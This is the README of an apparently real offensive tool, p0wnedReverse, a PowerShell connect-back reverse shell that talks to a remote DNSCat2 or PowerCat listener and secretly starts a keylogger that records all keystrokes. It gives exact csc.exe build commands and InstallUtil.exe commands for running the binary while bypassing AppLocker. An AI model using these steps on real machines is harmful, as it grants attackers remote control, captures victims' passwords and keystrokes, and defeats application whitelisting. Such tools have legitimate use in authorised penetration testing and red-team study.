# p0wnedReverse
PowerShell Runspace Connect-Back Shell

### Author: Cn33liz and Skons

License: BSD 3-Clause

### What is it:

p0wnedReverse is based on the same code as [p0wnedShell](https://github.com/Cn33liz/p0wnedShell) and can be used as an Reversed (Connect-Back) shell.
Communication Channels are made using Besimorhino's PowerCat code and you can choose between DNS TXT or TCP Communication Channels.
When the code is run it also starts an C# Keylogger that logs all keystrokes to "$env:Temp\KeyLog-*". You can use the Get-Keystrokes command within the shell to display all logged keystrokes.   
For a DNS tunnel you need to run a remote [DNSCat2 Listener](https://github.com/iagox86/dnscat2) and for TCP communication you can use [p0wnedShell](https://github.com/Cn33liz/p0wnedShell) to setup a Powercat Listener.


### How to Compile it:

To compile p0wnedReverse you need to import this project within Microsoft Visual Studio or if you don't have access to a Visual Studio installation, you can compile it as follows:

To Compile as x86 binary:

```
cd \Windows\Microsoft.NET\Framework\v4.0.30319

csc.exe /unsafe /reference:"C:\p0wnedReverse\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\p0wnedReverse\p0wnedReversex86.exe /platform:x86 "C:\p0wnedReverse\*.cs"
```

To Compile as x64 binary:

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319

csc.exe /unsafe /reference:"C:\p0wnedReverse\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\p0wnedReverse\p0wnedReversex64.exe /platform:x64 "C:\p0wnedReverse\*.cs"
```

p0wnedReverse uses the System.Management.Automation namespace, so make sure you have the System.Management.Automation.dll within your source path when compiling outside of Visual Studio.

### How to use it:

Just run the executables or...

To run as x86 binary and bypass Applocker (Credits for this great bypass go to Casey Smith aka subTee):

```
cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReversex86.exe
```

To run as x64 binary and bypass Applocker:

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)

InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReversex64.exe
```
